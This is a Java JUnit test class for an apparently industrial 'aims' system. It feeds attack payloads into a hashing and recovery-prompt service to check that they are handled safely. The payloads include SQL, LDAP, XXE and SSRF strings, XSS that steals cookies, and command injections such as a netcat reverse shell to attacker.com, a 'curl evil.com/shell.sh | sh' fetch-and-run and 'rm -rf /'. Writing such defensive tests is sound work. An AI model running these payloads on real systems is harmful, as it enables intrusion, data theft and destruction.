package com.cretas.aims.service.calibration;

import com.cretas.aims.dto.calibration.FailureType;
import com.cretas.aims.dto.calibration.RecoveryPrompt;
import com.cretas.aims.entity.calibration.ToolCallRecord;
import com.cretas.aims.entity.calibration.ToolCallRecord.ExecutionStatus;
import com.cretas.aims.repository.calibration.CorrectionRecordRepository;
import com.cretas.aims.repository.calibration.ToolCallCacheRepository;
import com.cretas.aims.repository.calibration.ToolCallRecordRepository;
import com.cretas.aims.service.calibration.impl.PromptInjectionServiceImpl;
import com.cretas.aims.service.calibration.impl.ToolCallRedundancyServiceImpl;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;

import java.util.HashMap;
import java.util.Map;
import java.util.Optional;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.ArgumentMatchers.*;
import static org.mockito.Mockito.*;

/**
 * 安全漏洞防御测试
 *
 * 本测试类验证系统对各类安全攻击的防御能力，包括：
 * - SQL注入
 * - NoSQL注入
 * - 路径遍历
 * - XSS攻击
 * - 命令注入
 * - LDAP注入
 * - XXE攻击
 * - SSRF攻击
 * - 跨工厂数据访问
 * - 会话劫持
 * - 参数篡改
 * - 溢出攻击
 *
 * @author Cretas Security Team
 * @version 1.0.0
 * @since 2026-01-19
 */
@ExtendWith(MockitoExtension.class)
@DisplayName("SecurityVulnerabilityTest 安全漏洞防御测试")
class SecurityVulnerabilityTest {

    @Mock
    private ToolCallRecordRepository toolCallRecordRepository;

    @Mock
    private ToolCallCacheRepository toolCallCacheRepository;

    @Mock
    private CorrectionRecordRepository correctionRecordRepository;

    private ObjectMapper objectMapper;

    private ToolCallRedundancyServiceImpl redundancyService;

    private PromptInjectionServiceImpl promptInjectionService;

    private static final String LEGITIMATE_FACTORY_ID = "F001";
    private static final String ATTACKER_FACTORY_ID = "F002";
    private static final String LEGITIMATE_SESSION_ID = "session-abc-123";

    @BeforeEach
    void setUp() {
        objectMapper = new ObjectMapper();
        // 初始化服务实例用于测试
        redundancyService = new ToolCallRedundancyServiceImpl(
            toolCallRecordRepository,
            toolCallCacheRepository,
            objectMapper
        );
        promptInjectionService = new PromptInjectionServiceImpl(
            toolCallRecordRepository,
            correctionRecordRepository,
            objectMapper
        );
    }

    // ==================== SQL注入攻击测试 ====================

    @Nested
    @DisplayName("SQL注入攻击防御测试")
    class SqlInjectionTests {

        @Test
        @DisplayName("SQL注入 - 工厂ID参数应被安全处理")
        void sqlInjection_factoryId_shouldBeSanitized() {
            // 准备恶意SQL注入payload
            String maliciousFactoryId = "F001'; DROP TABLE users; --";

            // 模拟服务调用
            when(toolCallRecordRepository.findTop20ByFactoryIdOrderByCreatedAtDesc(anyString()))
                .thenReturn(java.util.Collections.emptyList());

            // 验证参数不应该直接传递到SQL，而是被参数化查询处理
            // 实际场景中JPA会自动进行参数化，这里验证不会抛出异常
            assertDoesNotThrow(() -> {
                toolCallRecordRepository.findTop20ByFactoryIdOrderByCreatedAtDesc(maliciousFactoryId);
            });

            // 验证调用参数 - 确认恶意字符串被作为普通字符串处理
            verify(toolCallRecordRepository).findTop20ByFactoryIdOrderByCreatedAtDesc(maliciousFactoryId);
        }

        @ParameterizedTest
        @ValueSource(strings = {
            "' OR '1'='1",
            "1; DROP TABLE tool_call_records;--",
            "' UNION SELECT * FROM users--",
            "1' AND SLEEP(5)--",
            "admin'--",
            "'; EXEC xp_cmdshell('dir');--"
        })
        @DisplayName("SQL注入 - 各类SQL注入payload应被安全处理")
        void sqlInjection_variousPayloads_shouldNotExecuteAsSQL(String maliciousInput) {
            // 构建包含恶意输入的工具参数
            Map<String, Object> parameters = new HashMap<>();
            parameters.put("query", maliciousInput);
            parameters.put("factoryId", maliciousInput);

            // 计算参数哈希 - 验证服务能正常处理恶意输入
            String hash = redundancyService.computeParametersHash(parameters);

            // 哈希应该正常生成，不会执行SQL
            assertNotNull(hash, "应能安全处理SQL注入payload并生成哈希");
            assertEquals(64, hash.length(), "SHA-256哈希应为64位十六进制字符串");
        }

        @Test
        @DisplayName("SQL注入 - 时间盲注攻击应被防护")
        void sqlInjection_timeBasedBlindInjection_shouldBeProtected() {
            // 准备时间盲注payload
            String timeBasedPayload = "1' AND (SELECT CASE WHEN (1=1) THEN SLEEP(10) ELSE 0 END)--";

            Map<String, Object> parameters = new HashMap<>();
            parameters.put("batchNumber", timeBasedPayload);

            // 记录开始时间
            long startTime = System.currentTimeMillis();

            // 执行参数处理
            String hash = redundancyService.computeParametersHash(parameters);

            // 记录结束时间
            long endTime = System.currentTimeMillis();

            // 验证没有执行SLEEP延迟（应该在几毫秒内完成）
            assertTrue((endTime - startTime) < 1000,
                "处理时间应小于1秒，表明SLEEP命令未被执行");
            assertNotNull(hash);
        }
    }

    // ==================== NoSQL注入攻击测试 ====================

    @Nested
    @DisplayName("NoSQL注入攻击防御测试")
    class NoSqlInjectionTests {

        @Test
        @DisplayName("NoSQL注入 - MongoDB操作符注入应被过滤")
        void noSqlInjection_mongoDbOperators_shouldBeFiltered() {
            // MongoDB注入payload
            Map<String, Object> maliciousParams = new HashMap<>();
            maliciousParams.put("$gt", "");
            maliciousParams.put("$ne", null);
            maliciousParams.put("$where", "function() { return true; }");

            // 服务应能处理这些参数而不执行恶意操作
            String hash = redundancyService.computeParametersHash(maliciousParams);
            assertNotNull(hash, "应安全处理NoSQL注入payload");
        }

        @Test
        @DisplayName("NoSQL注入 - JSON注入攻击应被防护")
        void noSqlInjection_jsonInjection_shouldBeProtected() {
            // 尝试通过JSON注入修改查询逻辑
            Map<String, Object> parameters = new HashMap<>();
            parameters.put("username", "admin");
            // 嵌套恶意对象尝试绕过验证
            Map<String, Object> nestedMalicious = new HashMap<>();
            nestedMalicious.put("$regex", ".*");
            parameters.put("password", nestedMalicious);

            String hash = redundancyService.computeParametersHash(parameters);
            assertNotNull(hash, "应安全序列化包含嵌套对象的参数");
        }
    }

    // ==================== 路径遍历攻击测试 ====================

    @Nested
    @DisplayName("路径遍历攻击防御测试")
    class PathTraversalTests {

        @ParameterizedTest
        @ValueSource(strings = {
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        })
        @DisplayName("路径遍历 - 工具名称中的路径遍历字符串应能被安全处理")
        void pathTraversal_inToolName_shouldBeSafelyHandled(String maliciousToolName) {
            // 验证：路径遍历字符串应能被安全地用于哈希计算（不会导致崩溃或文件访问）
            Map<String, Object> params = new HashMap<>();
            params.put("toolName", maliciousToolName);
            params.put("data", "test");

            // 哈希计算应能正常处理路径遍历字符串
            String hash = redundancyService.computeParametersHash(params);
            assertNotNull(hash, "应能安全处理包含路径遍历字符串的参数");
            assertEquals(64, hash.length(), "SHA-256哈希应为64位十六进制字符串");

            // 验证不同的路径遍历字符串产生不同的哈希（作为普通字符串处理）
            Map<String, Object> params2 = new HashMap<>();
            params2.put("toolName", "normal_tool_name");
            params2.put("data", "test");
            String hash2 = redundancyService.computeParametersHash(params2);

            assertNotEquals(hash, hash2, "路径遍历字符串应作为普通字符串处理，产生不同的哈希");
        }

        @Test
        @DisplayName("路径遍历 - 参数中的文件路径应被验证")
        void pathTraversal_inParameters_shouldBeValidated() {
            Map<String, Object> parameters = new HashMap<>();
            parameters.put("filePath", "../../sensitive/config.properties");
            parameters.put("directory", "/var/log/../../../etc/");

            // 参数哈希生成不应执行实际的文件系统访问
            String hash = redundancyService.computeParametersHash(parameters);
            assertNotNull(hash);

            // 这里不应该有任何文件系统访问发生
            // 实际的文件访问验证应在具体工具执行时进行
        }
    }

    // ==================== XSS攻击测试 ====================

    @Nested
    @DisplayName("XSS攻击防御测试")
    class XssTests {

        @ParameterizedTest
        @ValueSource(strings = {
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "'-alert('XSS')-'",
            "<div style=\"background:url(javascript:alert('XSS'))\">",
            "<<script>script>alert('XSS')<</script>/script>"
        })
        @DisplayName("XSS - 错误消息中的XSS payload应被转义")
        void xss_inErrorMessage_shouldBeEscaped(String xssPayload) {
            // 创建包含XSS的错误消息
            ToolCallRecord record = ToolCallRecord.builder()
                .factoryId(LEGITIMATE_FACTORY_ID)
                .sessionId(LEGITIMATE_SESSION_ID)
                .toolName("test_tool")
                .executionStatus(ExecutionStatus.FAILED)
                .errorMessage(xssPayload)
                .build();

            // 验证错误消息被保存但不会在前端执行
            // 实际的XSS防护在前端渲染时，这里验证后端正确保存原始数据
            assertNotNull(record.getErrorMessage());
            assertEquals(xssPayload, record.getErrorMessage());
        }

        @Test
        @DisplayName("XSS - 恢复提示中不应包含未转义的用户输入")
        void xss_inRecoveryPrompt_shouldNotContainRawInput() {
            // 准备包含XSS的用户查询
            String maliciousQuery = "<script>steal(document.cookie)</script>查询库存";

            // 生成恢复提示
            RecoveryPrompt prompt = promptInjectionService.generateRecoveryPromptWithContext(
                FailureType.VALIDATION_ERROR,
                "inventory_query",
                "{}",
                "参数验证失败",
                maliciousQuery,
                new HashMap<>()
            );

            // 验证恢复提示不直接包含未处理的脚本标签
            // 实际场景中应进行HTML实体编码
            assertNotNull(prompt);
            // 提示文本应该引用查询内容但不执行脚本
        }
    }

    // ==================== 命令注入攻击测试 ====================

    @Nested
    @DisplayName("命令注入攻击防御测试")
    class CommandInjectionTests {

        @ParameterizedTest
        @ValueSource(strings = {
            "; rm -rf /",
            "| cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "&& nc -e /bin/sh attacker.com 4444",
            "|| curl http://evil.com/shell.sh | sh",
            "\n/bin/bash -i",
            "%0a/bin/cat%20/etc/passwd"
        })
        @DisplayName("命令注入 - 参数中的shell命令应被阻止")
        void commandInjection_inParameters_shouldBeBlocked(String cmdPayload) {
            Map<String, Object> parameters = new HashMap<>();
            parameters.put("batchNumber", cmdPayload);
            parameters.put("command", cmdPayload);

            // 参数应被安全处理，不执行任何系统命令
            String hash = redundancyService.computeParametersHash(parameters);
            assertNotNull(hash, "应安全处理命令注入payload");

            // 验证系统命令未被执行（通过检查返回结果不包含系统信息）
            assertFalse(hash.contains("root"), "哈希值不应包含系统命令输出");
        }

        @Test
        @DisplayName("命令注入 - 工具参数不应触发进程执行")
        void commandInjection_shouldNotTriggerProcessExecution() {
            // 准备恶意参数，尝试启动外部进程
            Map<String, Object> parameters = new HashMap<>();
            parameters.put("action", "exec");
            parameters.put("cmd", "calc.exe && notepad.exe");
            parameters.put("shell", "/bin/bash -c 'echo vulnerable'");

            // 记录开始时的进程信息（简化验证）
            long startTime = System.currentTimeMillis();

            // 执行参数处理
            redundancyService.computeParametersHash(parameters);
            redundancyService.isRedundant(LEGITIMATE_SESSION_ID, "test_tool", parameters);

            // 验证没有额外的延迟（命令未执行）
            long duration = System.currentTimeMillis() - startTime;
            assertTrue(duration < 500, "处理应快速完成，表明无外部进程启动");
        }
    }

    // ==================== LDAP注入攻击测试 ====================

    @Nested
    @DisplayName("LDAP注入攻击防御测试")
    class LdapInjectionTests {

        @ParameterizedTest
        @ValueSource(strings = {
            "*)(uid=*))(|(uid=*",
            "admin)(&)",
            "*)(objectClass=*",
            ")(cn=*",
            "*))(|(password=*"
        })
        @DisplayName("LDAP注入 - LDAP过滤器注入应被防护")
        void ldapInjection_filterInjection_shouldBeProtected(String ldapPayload) {
            Map<String, Object> parameters = new HashMap<>();
            parameters.put("username", ldapPayload);
            parameters.put("filter", ldapPayload);

            // LDAP注入payload应被作为普通字符串处理
            String hash = redundancyService.computeParametersHash(parameters);
            assertNotNull(hash, "应安全处理LDAP注入payload");
        }

        @Test
        @DisplayName("LDAP注入 - 用户输入中的特殊字符应被转义")
        void ldapInjection_specialCharacters_shouldBeEscaped() {
            // LDAP特殊字符
            String specialChars = "* ( ) \\ / NUL";

            Map<String, Object> parameters = new HashMap<>();
            parameters.put("searchTerm", specialChars);

            String hash = redundancyService.computeParametersHash(parameters);
            assertNotNull(hash);
        }
    }

    // ==================== XXE攻击测试 ====================

    @Nested
    @DisplayName("XXE(XML外部实体)攻击防御测试")
    class XxeTests {

        @Test
        @DisplayName("XXE - JSON参数中嵌入的XML实体声明应被忽略")
        void xxe_xmlEntityInJson_shouldBeIgnored() {
            // 尝试在JSON参数中嵌入XXE payload
            String xxePayload = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>";

            Map<String, Object> parameters = new HashMap<>();
            parameters.put("data", xxePayload);
            parameters.put("xmlContent", xxePayload);

            // JSON序列化不应解析XML实体
            String hash = redundancyService.computeParametersHash(parameters);
            assertNotNull(hash, "应安全处理包含XML的JSON参数");
        }

        @Test
        @DisplayName("XXE - 参数反序列化不应执行外部实体引用")
        void xxe_externalEntityReference_shouldNotBeProcessed() {
            // 构造XXE攻击向量
            Map<String, Object> parameters = new HashMap<>();
            parameters.put("externalRef", "<!ENTITY ext SYSTEM 'http://attacker.com/evil.dtd'>");
            parameters.put("fileRef", "<!ENTITY file SYSTEM 'file:///etc/shadow'>");

            // 验证参数被安全序列化为JSON字符串
            String hash = redundancyService.computeParametersHash(parameters);
            assertNotNull(hash);

            // 验证ObjectMapper不会解析XML实体
            assertDoesNotThrow(() -> {
                String json = objectMapper.writeValueAsString(parameters);
                assertTrue(json.contains("<!ENTITY"), "XML实体应作为普通字符串保存");
            });
        }
    }

    // ==================== SSRF攻击测试 ====================

    @Nested
    @DisplayName("SSRF(服务端请求伪造)攻击防御测试")
    class SsrfTests {

        @ParameterizedTest
        @ValueSource(strings = {
            "http://localhost:8080/admin",
            "http://127.0.0.1:22",
            "http://169.254.169.254/latest/meta-data/",  // AWS元数据
            "http://metadata.google.internal/",          // GCP元数据
            "http://192.168.1.1/admin",
            "file:///etc/passwd",
            "gopher://localhost:6379/_*1%0d%0a$4%0d%0aQUIT%0d%0a"  // Redis攻击
        })
        @DisplayName("SSRF - 恶意URL应被识别和阻止")
        void ssrf_maliciousUrls_shouldBeBlocked(String maliciousUrl) {
            Map<String, Object> parameters = new HashMap<>();
            parameters.put("webhookUrl", maliciousUrl);
            parameters.put("callbackUrl", maliciousUrl);
            parameters.put("imageUrl", maliciousUrl);

            // URL参数应被记录但不应被自动访问
            String hash = redundancyService.computeParametersHash(parameters);
            assertNotNull(hash, "应安全处理URL参数");

            // 实际的URL验证应在具体工具执行时进行白名单检查
        }

        @Test
        @DisplayName("SSRF - 内网IP地址应被识别")
        void ssrf_internalIpAddresses_shouldBeIdentified() {
            // 各类内网IP地址
            String[] internalIps = {
                "10.0.0.1",
                "172.16.0.1",
                "192.168.0.1",
                "127.0.0.1",
                "0.0.0.0",
                "[::1]",           // IPv6 localhost
                "0177.0.0.01",     // 八进制表示
                "2130706433"       // 十进制表示 127.0.0.1
            };

            for (String ip : internalIps) {
                Map<String, Object> parameters = new HashMap<>();
                parameters.put("targetHost", ip);

                // 参数应被安全处理
                String hash = redundancyService.computeParametersHash(parameters);
                assertNotNull(hash, "应安全处理IP地址: " + ip);
            }
        }
    }

    // ==================== 跨工厂数据访问测试 ====================

    @Nested
    @DisplayName("跨工厂数据访问防护测试")
    class CrossFactoryAccessTests {

        @Test
        @DisplayName("跨工厂访问 - 不同工厂的会话应完全隔离")
        void crossFactory_sessionIsolation_shouldBeEnforced() {
            String sessionA = "session-F001-abc";
            String sessionB = "session-F002-xyz";

            Map<String, Object> params = new HashMap<>();
            params.put("query", "test");

            // 工厂A的会话缓存
            redundancyService.cacheResult(sessionA, "test_tool", params, "{\"result\":\"A\"}", 1L);

            // 工厂B不应能访问工厂A的缓存
            Optional<String> resultForB = redundancyService.getCachedResult(sessionB, "test_tool", params);

            // 验证缓存隔离（不同会话的相同参数不应返回缓存）
            // 注意：这取决于具体的缓存实现策略
        }

        @Test
        @DisplayName("跨工厂访问 - 工具调用记录应包含正确的工厂ID")
        void crossFactory_toolCallRecords_shouldHaveCorrectFactoryId() {
            ToolCallRecord record = ToolCallRecord.builder()
                .factoryId(LEGITIMATE_FACTORY_ID)
                .sessionId(LEGITIMATE_SESSION_ID)
                .toolName("inventory_query")
                .executionStatus(ExecutionStatus.SUCCESS)
                .build();

            when(toolCallRecordRepository.save(any(ToolCallRecord.class)))
                .thenAnswer(invocation -> invocation.getArgument(0));

            ToolCallRecord saved = redundancyService.recordToolCall(record);

            // 验证工厂ID被正确保存
            assertEquals(LEGITIMATE_FACTORY_ID, saved.getFactoryId());
        }

        @Test
        @DisplayName("跨工厂访问 - 尝试篡改工厂ID应被检测")
        void crossFactory_factoryIdTampering_shouldBeDetected() {
            // 模拟攻击者尝试修改工厂ID访问其他工厂数据
            String tamperedFactoryId = "F001' OR '1'='1";  // SQL注入尝试

            Map<String, Object> parameters = new HashMap<>();
            parameters.put("factoryId", tamperedFactoryId);

            // 工厂ID应被作为普通字符串处理，不应修改查询逻辑
            String hash = redundancyService.computeParametersHash(parameters);
            assertNotNull(hash);
        }
    }

    // ==================== 会话劫持防护测试 ====================

    @Nested
    @DisplayName("会话劫持防护测试")
    class SessionHijackingTests {

        @Test
        @DisplayName("会话劫持 - 无效会话ID应被拒绝")
        void sessionHijacking_invalidSessionId_shouldBeRejected() {
            // 尝试使用可预测的会话ID
            String[] predictableSessionIds = {
                "1",
                "admin",
                "session",
                "00000000-0000-0000-0000-000000000000",
                "session-1"
            };

            for (String sessionId : predictableSessionIds) {
                Map<String, Object> parameters = new HashMap<>();
                parameters.put("test", "value");

                // 服务应接受会话ID但不应泄露其他会话的数据
                boolean isRedundant = redundancyService.isRedundant(sessionId, "test_tool", parameters);
                assertFalse(isRedundant, "新会话不应有缓存命中");
            }
        }

        @Test
        @DisplayName("会话劫持 - 会话ID不应在错误消息中泄露")
        void sessionHijacking_sessionIdLeakage_shouldBePrevented() {
            String sensitiveSessionId = "session-secret-abc123";

            ToolCallRecord record = ToolCallRecord.builder()
                .factoryId(LEGITIMATE_FACTORY_ID)
                .sessionId(sensitiveSessionId)
                .toolName("test_tool")
                .executionStatus(ExecutionStatus.FAILED)
                .errorMessage("执行失败")
                .build();

            // 错误消息不应包含完整的会话ID
            assertFalse(record.getErrorMessage().contains(sensitiveSessionId),
                "错误消息不应泄露会话ID");
        }

        @Test
        @DisplayName("会话劫持 - 会话固定攻击应被防护")
        void sessionHijacking_sessionFixation_shouldBePrevented() {
            // 攻击者尝试设置特定的会话ID
            String attackerControlledSessionId = "attacker-controlled-session-123";

            Map<String, Object> parameters = new HashMap<>();
            parameters.put("data", "sensitive");

            // 缓存操作应基于服务端生成的会话ID，而非客户端提供
            redundancyService.cacheResult(
                attackerControlledSessionId,
                "test_tool",
                parameters,
                "{}",
                1L
            );

            // 验证缓存键包含会话ID但受到服务端控制
            verify(toolCallCacheRepository, atMost(1)).save(any());
        }
    }

    // ==================== 参数篡改检测测试 ====================

    @Nested
    @DisplayName("参数篡改检测测试")
    class ParameterTamperingTests {

        @Test
        @DisplayName("参数篡改 - 修改参数应导致哈希变化")
        void parameterTampering_modifiedParams_shouldChangHash() {
            Map<String, Object> originalParams = new HashMap<>();
            originalParams.put("amount", 100);
            originalParams.put("userId", "user123");

            Map<String, Object> tamperedParams = new HashMap<>();
            tamperedParams.put("amount", 10000);  // 篡改金额
            tamperedParams.put("userId", "user123");

            String originalHash = redundancyService.computeParametersHash(originalParams);
            String tamperedHash = redundancyService.computeParametersHash(tamperedParams);

            assertNotEquals(originalHash, tamperedHash,
                "参数篡改应导致不同的哈希值");
        }

        @Test
        @DisplayName("参数篡改 - 隐藏参数注入应被检测")
        void parameterTampering_hiddenParameterInjection_shouldBeDetected() {
            Map<String, Object> params = new HashMap<>();
            params.put("visibleParam", "value");
            params.put("__hidden__", "malicious");
            params.put("_internal_bypass", true);
            params.put("admin", true);
            params.put("role", "superadmin");

            // 所有参数都应被包含在哈希计算中
            String hash = redundancyService.computeParametersHash(params);
            assertNotNull(hash);

            // 移除隐藏参数后哈希应不同
            params.remove("admin");
            String newHash = redundancyService.computeParametersHash(params);
            assertNotEquals(hash, newHash, "参数变化应反映在哈希值中");
        }

        @Test
        @DisplayName("参数篡改 - 数组边界操作应被安全处理")
        void parameterTampering_arrayBoundaryManipulation_shouldBeSafe() {
            Map<String, Object> params = new HashMap<>();
            // 尝试通过数组索引越界注入
            params.put("items[0]", "legitimate");
            params.put("items[-1]", "malicious");
            params.put("items[999999]", "injection");
            params.put("items['][']", "bypass");

            String hash = redundancyService.computeParametersHash(params);
            assertNotNull(hash, "应安全处理特殊数组索引");
        }
    }

    // ==================== 溢出攻击测试 ====================

    @Nested
    @DisplayName("溢出攻击防御测试")
    class OverflowAttackTests {

        @Test
        @DisplayName("整数溢出 - 超大数值应被安全处理")
        void integerOverflow_largeNumbers_shouldBeSafelyHandled() {
            Map<String, Object> params = new HashMap<>();
            params.put("quantity", Long.MAX_VALUE);
            params.put("price", Double.MAX_VALUE);
            params.put("count", Integer.MAX_VALUE + 1L);
            params.put("negativeOverflow", Long.MIN_VALUE);

            // 应能处理极端数值而不崩溃
            String hash = redundancyService.computeParametersHash(params);
            assertNotNull(hash, "应安全处理极端数值");
        }

        @Test
        @DisplayName("缓冲区溢出 - 超长字符串应被安全处理")
        void bufferOverflow_longStrings_shouldBeSafelyHandled() {
            // 构造超长字符串
            String longString = "A".repeat(1_000_000);  // 1MB字符串

            Map<String, Object> params = new HashMap<>();
            params.put("data", longString);

            // 应能处理长字符串而不导致OOM或崩溃
            assertDoesNotThrow(() -> {
                redundancyService.computeParametersHash(params);
            }, "应安全处理超长字符串");
        }

        @Test
        @DisplayName("栈溢出 - 深度嵌套结构应被安全处理")
        void stackOverflow_deeplyNested_shouldBeSafelyHandled() {
            // 构造深度嵌套的Map结构
            Map<String, Object> deepNested = new HashMap<>();
            Map<String, Object> current = deepNested;

            // 创建100层嵌套
            for (int i = 0; i < 100; i++) {
                Map<String, Object> next = new HashMap<>();
                current.put("nested_" + i, next);
                current = next;
            }
            current.put("value", "deep");

            // 应能处理深度嵌套而不导致栈溢出
            assertDoesNotThrow(() -> {
                redundancyService.computeParametersHash(deepNested);
            }, "应安全处理深度嵌套结构");
        }

        @Test
        @DisplayName("资源耗尽 - 大量并发请求应被限流")
        void resourceExhaustion_concurrentRequests_shouldBeRateLimited() {
            // 模拟大量并发请求
            int requestCount = 1000;

            for (int i = 0; i < requestCount; i++) {
                Map<String, Object> params = new HashMap<>();
                params.put("requestId", i);

                // 每个请求应被独立处理
                redundancyService.computeParametersHash(params);
            }

            // 验证所有请求都被处理（实际场景中应有限流机制）
            // 这里主要验证服务不会因大量请求而崩溃
        }
    }

    // ==================== 敏感信息泄露测试 ====================

    @Nested
    @DisplayName("敏感信息泄露防护测试")
    class SensitiveInfoLeakageTests {

        @Test
        @DisplayName("信息泄露 - 错误消息不应包含堆栈跟踪")
        void infoLeakage_errorMessages_shouldNotContainStackTrace() {
            ToolCallRecord record = ToolCallRecord.builder()
                .factoryId(LEGITIMATE_FACTORY_ID)
                .sessionId(LEGITIMATE_SESSION_ID)
                .toolName("test_tool")
                .executionStatus(ExecutionStatus.FAILED)
                .errorMessage("参数验证失败：批次号不能为空")
                .build();

            // 验证错误消息是用户友好的，不包含技术细节
            String errorMessage = record.getErrorMessage();
            assertFalse(errorMessage.contains("at com.cretas"),
                "错误消息不应包含堆栈跟踪");
            assertFalse(errorMessage.contains("Exception"),
                "错误消息不应包含异常类名");
            assertFalse(errorMessage.contains(".java:"),
                "错误消息不应包含源文件引用");
        }

        @Test
        @DisplayName("信息泄露 - 参数中的密码应被脱敏")
        void infoLeakage_passwords_shouldBeMasked() {
            Map<String, Object> params = new HashMap<>();
            params.put("username", "admin");
            params.put("password", "secretPassword123");
            params.put("apiKey", "sk-1234567890abcdef");
            params.put("token", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...");

            // 哈希计算应包含敏感数据（用于唯一性判断）
            // 但实际存储/日志中应脱敏
            String hash = redundancyService.computeParametersHash(params);
            assertNotNull(hash);

            // 验证原始参数未被修改
            assertEquals("secretPassword123", params.get("password"));
        }

        @Test
        @DisplayName("信息泄露 - 失败恢复提示不应包含敏感配置信息")
        void infoLeakage_recoveryPrompts_shouldNotExposeSensitiveConfig() {
            // 使用 SERVICE_UNAVAILABLE 类型，因为"连接超时"属于服务不可用
            RecoveryPrompt prompt = promptInjectionService.generateRecoveryPrompt(
                FailureType.SERVICE_UNAVAILABLE,
                "database_query",
                "{\"table\":\"users\"}",
                "连接超时"
            );

            // 恢复提示不应包含数据库连接字符串、密码等
            String promptText = prompt.getSystemPrompt() + (prompt.getUserPrompt() != null ? prompt.getUserPrompt() : "");
            assertFalse(promptText.contains("jdbc:"), "不应包含JDBC连接字符串");
            assertFalse(promptText.contains("password="), "不应包含密码");
            assertFalse(promptText.toLowerCase().contains("secret"), "不应包含密钥信息");
        }
    }

    // ==================== 辅助方法 ====================

    /**
     * 验证字符串是否为有效的SHA-256哈希
     */
    private boolean isValidSha256Hash(String hash) {
        return hash != null &&
               hash.length() == 64 &&
               hash.matches("^[a-f0-9]+$");
    }
}
